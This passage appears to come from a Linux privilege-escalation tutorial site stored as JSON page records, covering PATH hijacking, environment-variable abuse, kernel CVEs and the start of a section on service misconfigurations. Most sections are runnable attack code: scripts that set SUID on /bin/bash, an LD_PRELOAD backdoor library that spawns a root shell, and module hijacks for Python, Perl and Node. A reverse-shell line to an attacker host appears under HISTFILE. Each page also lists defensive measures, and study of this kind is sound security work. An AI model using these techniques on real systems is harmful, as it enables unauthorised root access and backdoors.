-E \"system|exec|popen\" # 2. Example: /usr/bin/suid_binary does: system(\"ls -la /tmp\"); # 3. Create malicious 'ls' in writable PATH directory echo '#!/bin/bash chmod +s /bin/bash # Execute real ls to maintain functionality /bin/ls \"$@\"' > /tmp/ls chmod +x /tmp/ls # 4. Add /tmp to PATH (if not already) export PATH=/tmp:$PATH # 5. Execute SUID binary /usr/bin/suid_binary # /bin/bash becomes SUID root Important: Many modern SUID binaries sanitize PATH and ignore environment variables. But older or poorly written ones are vulnerable. F. Cron with Relative Paths in Scripts Many cron scripts use relative paths internally. Example Vulnerable Script: #!/bin/bash # /usr/local/bin/backup.sh cd /var/www tar -czf backup.tar.gz * # Actually uses 'tar' from PATH Exploitation: # Create malicious tar in a writable PATH directory echo '#!/bin/bash chmod +s /bin/bash' > /tmp/tar chmod +x /tmp/tar # If /tmp is in PATH before /bin: export PATH=/tmp:$PATH # Or if cron's PATH includes /tmp (unlikely) G. Scripts with source or . Commands If a script uses source or . to include other files without absolute paths. Exploitation: # Vulnerable script: . config.sh # No absolute path # Create config.sh in writable PATH directory echo 'chmod +s /bin/bash' > /tmp/config.sh chmod +x /tmp/config.sh # If /tmp in PATH, it gets sourced as root 4. Advanced Techniques A. PATH Precedence Exploitation Understanding PATH search order is crucial. The first match wins. Scenario: # PATH: /usr/local/bin:/usr/bin:/bin # Root calls: backup # Options to hijack (in order of preference): 1. /usr/local/bin/backup (if writable) - Best option 2. /usr/bin/backup (usually not writable) 3. /bin/backup (usually not writable) # If none writable, but you can add to PATH: # Change cron's PATH to: /tmp/bin:/usr/local/bin:/usr/bin:/bin # Then /tmp/bin/backup takes precedence Testing Priority: # See which command executes first which -a ls # Shows all locations of 'ls' in PATH order B. Exploiting Command Aliases If root's environment includes aliases, they might be exploitable. Exploitation: # Root's .bashrc: alias rm='rm -i' # Attacker in writable PATH: # Create 'rm' binary that executes backdoor first echo '#!/bin/bash chmod +s /bin/bash /bin/rm \"$@\"' > /tmp/rm chmod +x /tmp/rm # If /tmp is in PATH before alias definition, it executes C. LD_PRELOAD + PATH Combo Combining PATH hijacking with LD_PRELOAD for persistent backdoors. Exploitation: # 1. Create malicious library gcc -shared -fPIC -o /tmp/libbackdoor.so backdoor.c # 2. Create wrapper script in writable PATH cat > /tmp/ls \u003c\u003c 'EOF' #!/bin/bash export LD_PRELOAD=/tmp/libbackdoor.so /bin/ls \"$@\" EOF chmod +x /tmp/ls # 3. When root uses ls, LD_PRELOAD loads malicious library D. Bypassing a Restricted PATH Sometimes cron uses a restricted PATH but scripts can modify it. Exploitation: # Script starts with: PATH=/usr/bin:/bin # But then does: export PATH=$PATH:/tmp # If /tmp is in the expanded PATH, exploit works # Inject at the END: export PATH=$PATH:/tmp # Least priority, only works if command not found elsewhere # Better to inject at START: export PATH=/tmp:$PATH 5. Practical Attack Workflow Step 1: Enumerate PATH and Writable Directories: echo \"=== Current PATH ===\" echo $PATH | tr ':' '\\n' echo -e \"\\n=== Writable PATH Directories ===\" for dir in $(echo $PATH | tr ':' ' '); do if [ -w \"$dir\" ]; then echo \"[+] Writable: $dir\" # Check what's already there ls -la \"$dir\" | head -10 fi done echo -e \"\\n=== Writable Directories (not in PATH) ===\" find / -type d -writable ! -path \"/proc/*\" 2>/dev/null | head -20 Step 2: Identify Root Processes/Commands Without Full Paths: # Check cron jobs cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep -v '^#' | grep -v '^$' # Check init scripts grep -r \" [a-z]\" /etc/init.d/ 2>/dev/null | grep -v \"/\" | head -20 # Check systemd service files grep -r \"Exec\" /etc/systemd/system/*.service 2>/dev/null | grep -v \"/\" # Check user scripts find /home -name \"*.sh\" -exec grep -l \" [a-z]\" {} \\; 2>/dev/null Step 3: Determine Which Commands Can Be Hijacked: # Extract all potential command names from cron for file in /etc/crontab /etc/cron.d/*; do if [ -f \"$file\" ]; then grep -v '^#' \"$file\" | grep -v '^$' | awk '{print $NF}' | grep -v '/' | sort -u fi done # Extract from scripts for script in $(find /etc/cron* -type f); do grep -E \"(^|[^/])[a-zA-Z0-9_-]+\" \"$script\" | grep -v \"/\" | grep -v \"^#\" | sort -u done Step 4: Create Malicious Binary: # In the highest-priority writable PATH directory TARGET=\"/usr/local/bin/backup\" # Example target echo '#!/bin/bash # Backdoor payload cp /bin/bash /tmp/shell chmod +s /tmp/shell chown root:root /tmp/shell # Execute real command to maintain functionality /usr/bin/backup \"$@\"' > \"$TARGET\" chmod +x \"$TARGET\" Step 5: Trigger Execution: # Wait for cron # Or trigger manually if possible sudo /path/to/script # If you have sudo # Or restart service systemctl restart service_name # Or wait for system boot Step 6: Verify: ls -la /tmp/shell # -rwsr-sr-x 1 root root ... /tmp/shell /tmp/shell -p # root shell 6. Exploitable Scenarios Scenario Exploit Method Example Writable /usr/local/bin Place binary in /usr/local/bin Cron calls backup → executes /usr/local/bin/backup Cron PATH includes /tmp Place binary in /tmp If cron PATH: PATH=/tmp:/bin → hijack User .bashrc PATH modification Add /tmp to PATH before root su Root su - user → executes malicious commands SUID binary uses system() Create command in writable PATH system(\"ls\") executes malicious ls Script uses source without path Create sourced file in PATH . config.sh loads malicious config Script modifies PATH Inject before existing PATH PATH=/tmp:$PATH → /tmp takes priority Symlink attack Symlink to writable directory /usr/local/bin → /tmp/fake_bin 7. Defensive Measures For System Administrators: Use Absolute Paths in Scripts: # Bad backup_script # Good /usr/local/bin/backup_script /bin/cp /source /dest /usr/bin/tar -czf backup.tar.gz /data Restrict PATH Permissions: # Ensure PATH directories are not writable by non-root chmod 755 /usr/local/bin /usr/bin /bin /usr/sbin /sbin chown root:root /usr/local/bin /usr/bin /bin /usr/sbin /sbin Set Explicit PATH in Cron: # /etc/crontab PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin # Use only system directories Use -- to End Options: # Prevents arguments from being interpreted as options tar -czf backup.tar.gz -- /var/www/* Sanitize PATH in SUID Binaries: # In C/C++: Use absolute paths for system() calls system(\"/bin/ls -la /tmp\"); # Instead of system(\"ls -la /tmp\"); Disable Writable Directories in PATH: # Remove user-writable directories from system PATH export PATH=$(echo $PATH | tr ':' '\\n' | grep -v \"/tmp\" | grep -v \"/home\" | tr '\\n' ':') Use AppArmor/SELinux: # Restrict which binaries can be executed # AppArmor profile for cron Regular Audits: # Check for writable PATH directories daily for dir in $(echo $PATH | tr ':' ' '); do if [ -w \"$dir\" ]; then echo \"ALERT: Writable PATH: $dir\" fi done # Check for missing absolute paths in scripts find /etc/cron* -type f -exec grep -H \" [a-z]\" {} \\; | grep -v \"/\""},{"kind":"privesc","number":7,"order":207,"href":"privesc/07-environment-variable-abuse.html","slug":"07-environment-variable-abuse","page":"07-environment-variable-abuse.html","title":"Environment Variable Abuse","short":"Environment","summary":"Review LD_PRELOAD, library paths, shell startup variables and interpreter search paths.","part":"privesc","partNum":"PE","partName":"Privilege Escalation","readMinutes":19,"words":2064,"sections":18,"codeBlocks":43,"headings":[{"id":"environment-variable-abuse-for-privilege-escalation","text":"Environment Variable Abuse for Privilege Escalation","level":2},{"id":"1-understanding-environment-variables","text":"1. Understanding Environment Variables","level":3},{"id":"2-enumeration-finding-exploitable-variables","text":"2. Enumeration: Finding Exploitable Variables","level":3},{"id":"3-ld-preload-exploitation-most-dangerous","text":"3. LD_PRELOAD Exploitation (Most Dangerous)","level":3},{"id":"4-ld-library-path-exploitation","text":"4. LD_LIBRARY_PATH Exploitation","level":3},{"id":"5-ifs-internal-field-separator-exploitation","text":"5. IFS (Internal Field Separator) Exploitation","level":3},{"id":"6-editor-visual-exploitation","text":"6. EDITOR/VISUAL Exploitation","level":3},{"id":"7-pager-exploitation","text":"7. PAGER Exploitation","level":3},{"id":"8-bash-env-and-env-exploitation","text":"8. BASH_ENV and ENV Exploitation","level":3},{"id":"9-python-environment-exploitation","text":"9. Python Environment Exploitation","level":3},{"id":"10-perl-environment-exploitation","text":"10. Perl Environment Exploitation","level":3},{"id":"11-node-js-environment-exploitation","text":"11. Node.js Environment Exploitation","level":3},{"id":"12-ssh-environment-exploitation","text":"12. SSH Environment Exploitation","level":3},{"id":"13-tmpdir-exploitation","text":"13. TMPDIR Exploitation","level":3},{"id":"14-histfile-manipulation","text":"14. HISTFILE Manipulation","level":3},{"id":"15-shell-variable-exploitation","text":"15. SHELL Variable Exploitation","level":3},{"id":"16-practical-exploitation-workflow","text":"16. Practical Exploitation Workflow","level":3},{"id":"17-defensive-measures","text":"17. Defensive Measures","level":3}],"text":"Environment Variable Abuse for Privilege Escalation Environment variables are dynamic values that influence the behavior of processes. When privileged programs (root-owned processes, SUID binaries, or cron jobs) rely on unsanitized environment variables, attackers can manipulate them to execute arbitrary code with elevated privileges. 1. Understanding Environment Variables What Are Environment Variables? Key-value pairs that affect process behavior Inherited from parent process to child processes Can be set system-wide or per-user Critical for many system operations Common Environment Variables: Variable Purpose Exploitation Risk PATH Executable search paths High - command hijacking LD_PRELOAD Preload shared libraries Very High - code injection LD_LIBRARY_PATH Additional library search paths High - library hijacking IFS Internal Field Separator Medium - command parsing EDITOR/VISUAL Default text editor High - file overwrite PAGER Default pager Medium - command execution TMPDIR Temporary directory Low-Medium - file manipulation BASH_ENV Bash initialization file High - arbitrary code execution ENV Shell initialization (POSIX) High - arbitrary code execution SHELL Default shell Medium - command execution HOME Home directory Medium - file read/write HISTFILE Command history file Low - log tampering PYTHONPATH Python module search path High - module hijacking PERL5LIB Perl module search path High - module hijacking NODE_PATH Node.js module search path High - module hijacking LD_DEBUG Dynamic linker debugging Low - information leak RES_OPTIONS Resolver options Medium - DNS hijacking 2. Enumeration: Finding Exploitable Variables Check Current Environment: printenv # Or env # View specific variables echo $PATH echo $LD_PRELOAD echo $LD_LIBRARY_PATH echo $IFS echo $EDITOR Check Variables Inherited by Privileged Processes: # Check root's environment (if you can read /proc) cat /proc/1/environ | tr '\\0' '\\n' cat /proc/*/environ | tr '\\0' '\\n' | sort -u # Check cron's environment cat /etc/crontab | grep -i \"env\\|path\" cat /var/spool/cron/crontabs/* 2>/dev/null | grep -i \"env\\|path\" # Check sudo environment sudo -l # Shows environment variables preserved # Look for \"env_keep\" settings Check SUID Binary Environment Handling: # Run SUID binary with strace to see environment strace -e trace=execve /usr/bin/passwd 2>&1 | grep execve # Check which variables are preserved strings /usr/bin/suid_binary | grep -E \"^[A-Z_]+$\" Find Writable Environment Files: # System-wide environment files find /etc -name \"environment\" -o -name \"profile\" -o -name \"bash.bashrc\" -o -name \"*.sh\" -path \"*/profile.d/*\" 2>/dev/null # User environment files find /home -name \".bashrc\" -o -name \".profile\" -o -name \".bash_profile\" 2>/dev/null find /root -name \".bashrc\" -o -name \".profile\" 2>/dev/null Automated Tools: # LinPEAS environment checks ./linpeas.sh | grep -A 10 \"Environment\" # Manual comprehensive check for var in PATH LD_PRELOAD LD_LIBRARY_PATH IFS EDITOR VISUAL PAGER BASH_ENV SHELL; do echo \"$var = ${!var}\" done 3. LD_PRELOAD Exploitation (Most Dangerous) LD_PRELOAD loads a shared library before any other libraries. This allows overriding any function. A. Direct LD_PRELOAD on SUID Binaries Exploitation: # 1. Create malicious shared library cat > /tmp/backdoor.c \u003c\u003c 'EOF' #include \u003cstdio.h> #include \u003cstdlib.h> #include \u003cunistd.h> // Constructor runs when library is loaded __attribute__((constructor)) void init() { // Drop root privileges? No, we want to keep them setuid(0); setgid(0); system(\"/bin/bash -p\"); } // Override a common function (e.g., getuid) int getuid() { return 0; // Always return root } EOF # 2. Compile as shared library gcc -shared -fPIC /tmp/backdoor.c -o /tmp/backdoor.so # 3. Execute SUID binary with LD_PRELOAD LD_PRELOAD=/tmp/backdoor.so /usr/bin/passwd # This might not work if the binary sanitizes LD_PRELOAD Why It Might Not Work: Modern SUID binaries drop environment variables for security. B. LD_PRELOAD via sudo env_keep If sudo preserves LD_PRELOAD, this is a direct root shell. Exploitation: # Check if LD_PRELOAD is in env_keep sudo -l | grep env_keep | grep LD_PRELOAD # If present: export LD_PRELOAD=/tmp/backdoor.so sudo /bin/true # Any command, library loads as root Finding env_keep: # Check sudo configuration cat /etc/sudoers | grep env_keep cat /etc/sudoers.d/* | grep env_keep # Look for: env_keep += \"LD_PRELOAD\" C. LD_PRELOAD in Cron Environment If cron's environment includes LD_PRELOAD, every cron job will load your library. Exploitation: # Add to cron environment (if writable) # /etc/crontab: LD_PRELOAD=/tmp/backdoor.so * * * * * root /bin/true # Or add to user crontab (if you can) crontab -e # Add: LD_PRELOAD=/tmp/backdoor.so 4. LD_LIBRARY_PATH Exploitation LD_LIBRARY_PATH adds directories to the library search path. Exploitation: # 1. Find which libraries a SUID binary uses ldd /usr/bin/passwd # Output: libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 # 2. Create a directory with a fake library mkdir /tmp/fake_lib gcc -shared -fPIC -o /tmp/fake_lib/libc.so.6 backdoor.c # 3. Set LD_LIBRARY_PATH LD_LIBRARY_PATH=/tmp/fake_lib /usr/bin/passwd # 4. The binary loads your libc instead of system libc # This gives complete control Limitation: SUID binaries drop LD_LIBRARY_PATH (same as LD_PRELOAD). Bypass: If binary is SGID instead of SUID, some systems still honor LD_LIBRARY_PATH. 5. IFS (Internal Field Separator) Exploitation IFS determines how the shell splits words. Manipulating it can change command parsing. Vulnerable Script: #!/bin/bash # /usr/local/bin/backup.sh BACKUP_DIR=\"/backup\" FILE=\"data\" cp $BACKUP_DIR/$FILE /tmp/ # No quotes! Exploitation: # 1. Create malicious directory mkdir \"/backup/data\" echo 'cp /bin/bash /tmp/shell; chmod +s /tmp/shell' > \"/backup/data/x\" # 2. Set IFS to \"/\" so directory separators are ignored export IFS='/' # 3. Run the script (as root) /usr/local/bin/backup.sh # The command becomes: cp backup data /tmp/ (completely different!) Alternative IFS Exploit: # Script: echo \"User: $(whoami)\" # Set IFS to: \\n (newline) export IFS=$'\\n' # The command becomes: echo User: root (if executed as root) 6. EDITOR/VISUAL Exploitation If root uses these variables to open a file, the editor can be hijacked. Exploitation: # 1. Create malicious editor wrapper cat > /tmp/editor.sh \u003c\u003c 'EOF' #!/bin/bash # Execute backdoor, then open real editor chmod +s /bin/bash /usr/bin/vim \"$@\" EOF chmod +x /tmp/editor.sh # 2. Set EDITOR variable export EDITOR=/tmp/editor.sh export VISUAL=/tmp/editor.sh # 3. Trigger root's editor usage # sudo crontab -e (if root uses your editor) # sudo visudo (if uses your editor) Common Exploitation Points: # sudoedit (sudo -e) - opens files as root export EDITOR=/tmp/editor.sh sudo -e /etc/hosts # Your editor runs as root # crontab -e (as root) export EDITOR=/tmp/editor.sh sudo crontab -e # Git commits (if used by root) export EDITOR=/tmp/editor.sh sudo git commit --amend 7. PAGER Exploitation Some commands use PAGER to display output. If root runs such commands, you can hijack. Exploitation: # 1. Create malicious pager cat > /tmp/pager.sh \u003c\u003c 'EOF' #!/bin/bash chmod +s /bin/bash # Show actual output using less /usr/bin/less \"$@\" EOF chmod +x /tmp/pager.sh # 2. Set PAGER variable export PAGER=/tmp/pager.sh # 3. Trigger root command that uses PAGER # Example: systemctl status service sudo systemctl status sshd # Might use PAGER # Example: man pages (if root runs man) sudo man ls 8. BASH_ENV and ENV Exploitation BASH_ENV is read by non-interactive bash shells (cron, scripts). ENV is used by POSIX sh. Exploitation: # 1. Create malicious initialization file cat > /tmp/bashrc.sh \u003c\u003c 'EOF' #!/bin/bash chmod +s /bin/bash echo \"Backdoor installed\" EOF # 2. Set BASH_ENV export BASH_ENV=/tmp/bashrc.sh # 3. Any non-interactive bash script run as root will execute this sudo /bin/bash -c \"echo test\" # Or wait for cron to run a bash script Cron Attack: # Add to user's crontab (if you can) BASH_ENV=/tmp/backdoor.sh * * * * * root /bin/bash -c \"backup_script\" 9. Python Environment Exploitation A. PYTHONPATH Hijacking Modules are loaded from PYTHONPATH directories. Exploitation: # 1. Identify Python script called by root # Example: /usr/local/bin/backup.py # Contains: import os # 2. Create malicious os.py in writable directory mkdir /tmp/pylibs cat > /tmp/pylibs/os.py \u003c\u003c 'EOF' import os import subprocess # Backdoor subprocess.call([\"chmod\", \"+s\", \"/bin/bash\"]) # Forward to real os import sys sys.path.remove('/tmp/pylibs') sys.path.insert(0, '/usr/lib/python3/dist-packages') import os as real_os sys.modules['os'] = real_os EOF # 3. Set PYTHONPATH export PYTHONPATH=/tmp/pylibs # 4. Run the Python script as root sudo /usr/local/bin/backup.py B. Python Startup File (PYTHONSTARTUP) Executed when interactive Python starts. Exploitation: cat > /tmp/startup.py \u003c\u003c 'EOF' import os os.system(\"chmod +s /bin/bash\") EOF export PYTHONSTARTUP=/tmp/startup.py sudo python3 # When root runs Python interactively 10. Perl Environment Exploitation A. PERL5LIB and PERLLIB Module search paths for Perl. Exploitation: mkdir /tmp/perllibs cat > /tmp/perllibs/File/Find.pm \u003c\u003c 'EOF' package File::Find; sub find { system(\"chmod +s /bin/bash\"); } 1; EOF export PERL5LIB=/tmp/perllibs sudo perl -e 'use File::Find; find();' B. PERL_DEBUG and PERL_DESTRUCT_LEVEL Debugging variables can be exploited in some circumstances. 11. Node.js Environment Exploitation A. NODE_PATH Module Hijacking Exploitation: mkdir /tmp/nodemods cat > /tmp/nodemods/fs.js \u003c\u003c 'EOF' const { exec } = require('child_process'); exec('chmod +s /bin/bash'); module.exports = require('fs_original'); EOF export NODE_PATH=/tmp/nodemods sudo node /path/to/script.js 12. SSH Environment Exploitation If PermitUserEnvironment is enabled in SSH, users can set environment variables. Exploitation: # 1. Create ~/.ssh/environment echo \"LD_PRELOAD=/tmp/backdoor.so\" > ~/.ssh/environment # 2. Wait for root to SSH in # (or if SSH is configured to allow root login) # 3. When root connects, LD_PRELOAD loads as root Check SSH Configuration: grep -i \"PermitUserEnvironment\" /etc/ssh/sshd_config # If: PermitUserEnvironment yes -> Exploitable! 13. TMPDIR Exploitation If a privileged program uses TMPDIR to create temporary files, you can control file location. Exploitation: # 1. Create directory with malicious permissions mkdir /tmp/evil_tmp chmod 777 /tmp/evil_tmp # 2. Set TMPDIR export TMPDIR=/tmp/evil_tmp # 3. Run program that creates temporary files # If it creates a temporary script and executes it: # (this depends on the specific program behavior) # 4. Race condition: replace file before execution Example: Kernel Compilation: # If root compiles kernel with your TMPDIR export TMPDIR=/tmp/evil_tmp sudo make # May create files in /tmp/evil_tmp 14. HISTFILE Manipulation If root uses your HISTFILE, you can inject commands into root's history. Exploitation: # Create fake history file echo \"bash -i >& /dev/tcp/attacker/4444 0>&1\" > /tmp/fake_history # Set HISTFILE export HISTFILE=/tmp/fake_history # When root runs a command, it appends to your history # But you can't make root run your commands 15. SHELL Variable Exploitation Some programs use SHELL to spawn a shell. Exploitation: # 1. Create malicious shell wrapper cat > /tmp/shell.sh \u003c\u003c 'EOF' #!/bin/bash chmod +s /bin/bash /bin/bash \"$@\" EOF chmod +x /tmp/shell.sh # 2. Set SHELL export SHELL=/tmp/shell.sh # 3. Trigger program that uses SHELL sudo less /etc/hosts # 'v' command opens editor, uses SHELL # Or: sudo -i # Uses SHELL to start login shell 16. Practical Exploitation Workflow Step 1: Enumerate Environment Variables: # Check current environment printenv | sort # Check what sudo preserves sudo -l | grep env_keep # Check root's environment cat /proc/1/environ | tr '\\0' '\\n' | sort # Check cron's environment cat /etc/crontab | grep -v '^#' Step 2: Identify Privileged Programs: # Find SUID/SGID binaries find / -perm -4000 -type f 2>/dev/null find / -perm -2000 -type f 2>/dev/null # Find scripts executed by root (cron, init) find /etc/cron* -type f 2>/dev/null find /etc/init.d/ -type f 2>/dev/null Step 3: Check for Sanitization: # Test if LD_PRELOAD works on SUID binary export LD_PRELOAD=/lib/libc.so.6 # Already exists /usr/bin/passwd # If it works, LD_PRELOAD is NOT sanitized # Check if LD_LIBRARY_PATH works export LD_LIBRARY_PATH=/tmp /usr/bin/passwd Step 4: Choose Attack Vector: # Prioritize based on: # 1. LD_PRELOAD (if env_keep or unsanitized) # 2. LD_LIBRARY_PATH (if unsanitized) # 3. EDITOR/VISUAL (if root uses sudoedit or crontab -e) # 4. PATH (if writable directory in PATH) # 5. BASH_ENV (if cron uses bash) # 6. PYTHONPATH/PERL5LIB (if root runs scripts) Step 5: Create and Execute Exploit: # Example: LD_PRELOAD exploit cat > /tmp/backdoor.c \u003c\u003c 'EOF' #include \u003cstdio.h> #include \u003cstdlib.h> #include \u003cunistd.h> __attribute__((constructor)) void init() { setuid(0); system(\"/bin/bash -p\"); } EOF gcc -shared -fPIC /tmp/backdoor.c -o /tmp/backdoor.so export LD_PRELOAD=/tmp/backdoor.so sudo /bin/true # Any command Step 6: Verify Escalation: whoami # root id # uid=0(root) gid=0(root) groups=0(root) 17. Defensive Measures For System Administrators: Sanitize Environment in SUID Binaries: // In C/C++ programs clearenv(); // Clear all environment variables setenv(\"PATH\", \"/usr/local/bin:/usr/bin:/bin\", 1); Use env to Reset Environment: # Run command with clean environment env - /usr/bin/safe_command # In scripts #!/bin/bash exec env -i /usr/bin/safe_script Configure Sudo Properly: # In /etc/sudoers Defaults env_reset # Reset environment Defaults env_keep += \"HOME\" # Only necessary variables # Never include LD_PRELOAD in env_keep Defaults env_keep -= \"LD_PRELOAD\" Defaults env_keep -= \"LD_LIBRARY_PATH\" Set Explicit PATH in Scripts: #!/bin/bash export PATH=/usr/local/bin:/usr/bin:/bin # Now use commands without absolute paths safely Use Absolute Paths in Scripts: #!/bin/bash /bin/echo \"Using absolute path\" /usr/bin/tar -czf /backup/backup.tar.gz /data Remove Unnecessary Environment Variables: # In /etc/profile or /etc/bash.bashrc unset LD_PRELOAD unset LD_LIBRARY_PATH Set Secure Mount Options: # Mount /tmp with noexec to prevent library execution mount -o remount,noexec /tmp Use AppArmor/SELinux: # Restrict which libraries can be loaded # AppArmor profile for sensitive binaries Audit Environment Variables: # Check what users can set for user in $(getent passwd | cut -d: -f1); do echo \"=== $user ===\" sudo -u $user env 2>/dev/null done"},{"kind":"privesc","number":8,"order":208,"href":"privesc/08-kernel-exploits.html","slug":"08-kernel-exploits","page":"08-kernel-exploits.html","title":"Kernel Exploits","short":"Kernel","summary":"Compare historical kernel vulnerabilities, patch strategy and advisory verification.","part":"privesc","partNum":"PE","partName":"Privilege Escalation","readMinutes":5,"words":816,"sections":3,"codeBlocks":0,"headings":[{"id":"understanding-the-attack-process","text":"Understanding the Attack Process","level":3},{"id":"examples-of-major-kernel-vulnerabilities","text":"Examples of Major Kernel Vulnerabilities","level":3},{"id":"defensive-measures","text":"Defensive Measures","level":3}],"text":"Kernel vulnerabilities are a high-impact privilege escalation vector. Unlike misconfigurations, they exploit flaws within the core of the Linux operating system to grant an unprivileged user full root access. Advisory note: Kernel CVE records are updated as affected-version ranges, impact scores and exploit status become clearer. The summaries below reflect public records at the time of writing. Always check the kernel CVE record and your distribution's advisory before testing a claim or running an exploit. Understanding the Attack Process The general approach to exploiting a kernel vulnerability involves several key steps: Reconnaissance: An attacker first identifies the target system's kernel version. This is typically done with the uname -a command to check for known vulnerabilities . Exploit Selection: Once the kernel version is known, the attacker searches for a matching public exploit. Resources like GitHub and Exploit-DB are commonly used for this purpose . Execution: The exploit is compiled (often with gcc) and run. A successful exploit will typically drop a root shell or modify a critical system file to grant root access . Payload Delivery: The payload executed by the exploit can be anything from spawning a shell to adding a new user with root privileges. Examples of Major Kernel Vulnerabilities Several historical and recent vulnerabilities illustrate this attack vector. Dirty COW (CVE-2016-5195) Description: One of the most famous Linux kernel privilege escalation vulnerabilities. It is a race condition in the kernel's memory subsystem. Exploitation: A local user can exploit this flaw to write to any read-only file, such as /etc/passwd, and then escalate privileges to root . A common method is to overwrite the root user's password in /etc/passwd . Dirty Pipe (CVE-2022-0847) Description: A vulnerability in the Linux kernel's pipe subsystem that allows an unprivileged user to write to read-only files, including SUID binaries. Exploitation: The exploit can inject and overwrite data in a SUID process's memory, causing it to execute malicious code with root privileges when run . This vulnerability affected Linux kernel versions 5.8 through 5.16 . CVE-2026-31431 (algif_aead) Description: Public records describe a crypto subsystem fix for algif_aead that restores out-of-place operation. The advisory is not a general page-cache write primitive. Exploitation: Treat any public proof of concept as version and configuration specific. Check the kernel CVE record and your distribution advisory for affected versions, impact and prerequisites. DirtyCred (CVE-2022-2588) Description: A use-after-free (UAF) in the cls_route network filter. When the kernel frees an old filter without removing it from the hash table, an attacker can reuse the freed memory. Exploitation: Public research shows how the UAF can be shaped into a local privilege escalation. Container escape depends on the target's kernel, namespace configuration and available kernel interfaces, so verify those conditions instead of assuming they apply. CVE-2026-43284 and CVE-2026-43500 Description: Two kernel packet-handling fixes. CVE-2026-43284 addresses in-place ESP decryption over shared skb fragments. CVE-2026-43500 addresses shared paged fragments in rxrpc DATA and RESPONSE packets. Exploitation: Both records describe memory-safety fixes in network paths. Do not assume a public local privilege-escalation exploit exists. Check the vendor advisory for affected versions, remote or local reachability, and mitigations. CVE-2026-64600 (XFS) Description: An XFS fix that resamples the data-fork mapping after the inode lock is cycled. A stale mapping could make a reflink operation reason about the wrong physical blocks. Exploitation: The public record describes a filesystem correctness and memory-safety fix. Whether a system is exploitable depends on the kernel version, XFS reflink use and mount configuration. Check the vendor advisory before testing. PwnKit (CVE-2021-4034) Description: A vulnerability in pkexec, a component of Polkit. While often categorized as a local privilege escalation, it's a vulnerability in a core system component that runs with high privileges. Exploitation: A self-contained exploit for this vulnerability works \"out of the box\" on many vulnerable Linux distributions . Defensive Measures Given the power of kernel exploits, the primary defense is to prevent them from being possible in the first place. The Most Important Step: Keep the kernel patched. Promptly apply security updates from your Linux distribution vendors. This is the single most effective defense against kernel exploits . Use Live Patching: For critical systems that cannot be easily rebooted, consider using live-patching technologies to apply kernel security patches without a reboot . Apply Workarounds (Temporary): When a patch is not immediately available, apply vendor-provided workarounds. Depending on the advisory, this could involve disabling a vulnerable kernel module or adding boot parameters to blacklist a component. For CVE-2026-31431, check your vendor's guidance before changing the algif_aead module state. : Containers: Use seccomp filters and AppArmor policies to restrict the system calls (e.g., preventing socket creation with the AF_ALG protocol) that could be used to trigger the exploit . General Security: Apply the principle of least privilege and ensure systems are monitored so a foothold is harder to get . Retire End-of-Life Systems: Systems running end-of-life (EOL) kernels or distributions no longer receive security updates and are extremely vulnerable ."},{"kind":"privesc","number":9,"order":209,"href":"privesc/09-service-misconfigurations.html","slug":"09-service-misconfigurations","page":"09-service-misconfigurations.html","title":"Service Misconfigurations","short":"Services","summary":"Inspect unit files, writable binaries and unsafe service execution contexts.","part":"privesc","partNum":"PE","partName":"Privilege Escalation","readMinutes":17,"words":1802,"sections":14,"codeBlocks":38,"headings":[{"id":"service-misconfigurations-for-privilege-escalation","text":"Service Misconfigurations for Privilege Escalation","level":2},{"id":"1-understanding-service-misconfigurations","text":"1. Understanding Service Misconfigurations","level":3},{"id":"2-enumeration-finding-vulnerable-services","text":"2. Enumeration: Finding Vulnerable Services","level":3},{"id":"3-writable-service-binaries","text":"3. Writable Service Binaries","level":3},{"id":"4-writable-service-configuration-files","text":"4. Writable Service Configuration Files","level":3},{"id":"5-service-user-misconfigurations","text":"5. Service User Misconfigurations","level":3},{"id":"6-dangerous-service-options","text":"6. Dangerous Service Options","level":3},{"id":"7-service-file-inclusion-import","text":"7. Service File Inclusion/Import","level":3},{"id":"8-service-dependencies","text":"8. Service Dependencies","level":3},{"id":"9-inetd-xinetd-wrapper-scripts","text":"9. Inetd / Xinetd Wrapper Scripts","level":3},{"id":"10-service-socket-activation","text":"10. Service Socket Activation","level":3},{"id":"11-service-temporary-files","text":"11. Service Temporary Files","level":3},{"id":"12-practical-exploitation-workflow","text":"12. Practical Exploitation Workflow","level":3},{"id":"13-defensive-measures","text":"13. Defensive Measures","level":3}],"text":"Service Misconfigurations for Privilege Escalation Service misconfigurations are a prime privilege escalation vector where system services running as root have insecure configurations, writable binaries, or dangerous settings. Unlike cron jobs, services are constantly running and can be triggered immediately. 1. Understanding Service Misconfigurations What Are System Services? Background processes that start at boot or on-demand Run under specific users (often root or system users) Controlled by init systems (System V init, Upstart, Systemd) Typically found in /etc/init.d/, /etc/systemd/system/, /etc/xinetd.d/ Why They're Dangerous: Services run with root privileges They're constantly running (no need to wait for cron) Misconfigurations are persistent across reboots Often overlooked in security audits 2. Enumeration: Finding Vulnerable Services List All Running Services: systemctl list-units --type=service --state=running systemctl list-units --type=service --all # SysV init services service --status-all ls -la /etc/init.d/ # Upstart services (older systems) initctl list Check Service Permissions: # Find writable service files find /etc/systemd/system -name \"*.service\" -writable 2>/dev/null find /lib/systemd/system -name \"*.service\" -writable 2>/dev/null find /etc/init.d -type f -writable 2>/dev/null find /etc/xinetd.d -type f -writable 2>/dev/null # Check configuration directories ls -la /etc/systemd/system/ ls -la /etc/init.d/ Check Service Binaries: # Find services using writable binaries for service in $(systemctl list-units --type=service --state=running --no-legend | awk '{print $1}'); do binary=$(systemctl show $service -p ExecStart --no-pager | cut -d= -f2 | awk '{print $1}') if [ -f \"$binary\" ] && [ -w \"$binary\" ]; then echo \"[!] Writable binary: $binary (service: $service)\" fi done Check Service Configuration: # Look for dangerous options grep -r \"ExecStart\" /etc/systemd/system/*.service 2>/dev/null | grep -v \"/usr/bin\\|/bin/\" # Check for insecure permissions find /etc -name \"*.conf\" -exec ls -la {} \\; 2>/dev/null | grep -v root Automated Tools: # LinPEAS service checks ./linpeas.sh | grep -A 10 \"Services\" # Manual comprehensive check for service in $(systemctl list-units --type=service --state=running --no-legend | awk '{print $1}'); do echo \"=== $service ===\" systemctl show $service -p ExecStart,User,Group,ProtectSystem,PrivateTmp done 3. Writable Service Binaries If a service's binary is writable, replace it with a malicious version. Exploitation: # 1. Find writable service binaries find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -writable -exec ls -la {} \\; 2>/dev/null # 2. Identify which service uses it for binary in $(find /usr/bin /usr/sbin -type f -writable 